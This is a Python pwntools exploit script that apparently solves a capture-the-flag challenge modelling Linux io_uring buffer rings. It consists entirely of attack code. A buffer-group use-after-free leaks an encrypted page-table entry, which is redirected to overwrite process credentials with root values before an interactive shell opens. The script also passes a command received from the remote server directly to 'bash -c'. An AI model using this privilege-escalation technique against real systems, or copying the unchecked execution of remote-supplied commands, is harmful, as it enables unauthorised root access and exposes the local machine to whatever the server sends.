#!/usr/bin/env python3
from pwn import *
import re
import subprocess

context.log_level = "info"

HOST = "pwn.v1t.site"
PORT = 31337


def solve_pow(io):
    io.recvuntil(b"proof of work:\n")

    cmd = io.recvline().decode().strip()
    log.info(f"PoW command: {cmd}")

    result = subprocess.run(
        ["bash", "-c", cmd],
        capture_output=True,
        text=True,
        timeout=120,
        check=True,
    )

    solution = result.stdout.strip()

    if not solution:
        raise RuntimeError(
            f"PoW did not return a solution.\nstderr:\n{result.stderr}"
        )

    log.success(f"PoW solved: {solution}")
    io.sendlineafter(b"solution: ", solution.encode())


def start():
    io = remote(HOST, PORT)
    solve_pow(io)
    return io


io = start()


def choose(n: int):
    io.sendlineafter(b"> ", str(n).encode())


def register_pbuf(bgid: int, entries: int, flags: int = 1):
    choose(1)
    io.sendlineafter(b"bgid: ", str(bgid).encode())
    io.sendlineafter(b"entries: ", str(entries).encode())
    io.sendlineafter(b"flags: ", str(flags).encode())


def mmap_pbuf(bgid: int):
    choose(2)
    io.sendlineafter(b"bgid: ", str(bgid).encode())


def unregister_pbuf(bgid: int):
    choose(3)
    io.sendlineafter(b"bgid: ", str(bgid).encode())


def create_mm():
    choose(6)


def inspect(map_id: int, idx: int):
    choose(5)
    io.sendlineafter(b"map: ", str(map_id).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())

    line = io.recvline_contains(b"addr=")

    match = re.search(
        rb"addr=0x([0-9a-f]+) "
        rb"len=0x([0-9a-f]+) "
        rb"bid=0x([0-9a-f]+) "
        rb"resv=0x([0-9a-f]+)",
        line,
    )

    if not match:
        raise RuntimeError(f"unexpected inspect output: {line!r}")

    addr = int(match.group(1), 16)
    length = int(match.group(2), 16)
    bid = int(match.group(3), 16)
    resv = int(match.group(4), 16)

    high_qword = length | (bid << 32) | (resv << 48)

    return addr, high_qword


def buf_ring_add(map_id: int, idx: int, addr: int, length: int, bid: int, resv: int):
    choose(4)

    io.sendlineafter(b"map: ", str(map_id).encode())
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"addr: ", str(addr).encode())
    io.sendlineafter(b"len: ", str(length).encode())
    io.sendlineafter(b"bid: ", str(bid).encode())
    io.sendlineafter(b"resv: ", str(resv).encode())


def vm_write(vm: int, va: int, data: bytes):
    choose(9)

    io.sendlineafter(b"vm: ", str(vm).encode())
    io.sendlineafter(b"va: ", str(va).encode())
    io.sendlineafter(b"len: ", str(len(data)).encode())
    io.sendlineafter(b"hex: ", data.hex().encode())


register_pbuf(0, 256, 1)
mmap_pbuf(0)
unregister_pbuf(0)
create_mm()

_, scratch_pte = inspect(0, 3)
log.info(f"encrypted scratch PTE: {scratch_pte:#x}")

cred_pte = scratch_pte ^ ((3 ^ 1) << 12)
log.info(f"encrypted cred PTE: {cred_pte:#x}")

buf_ring_add(
    0,
    0,
    cred_pte,
    cred_pte & 0xffffffff,
    (cred_pte >> 32) & 0xffff,
    (cred_pte >> 48) & 0xffff,
)

root_cred = b"\x00" * 16 + b"\xff" * 8
vm_write(0, 8, root_cred)

choose(10)
print(io.recvline().decode(errors="replace"))

io.interactive()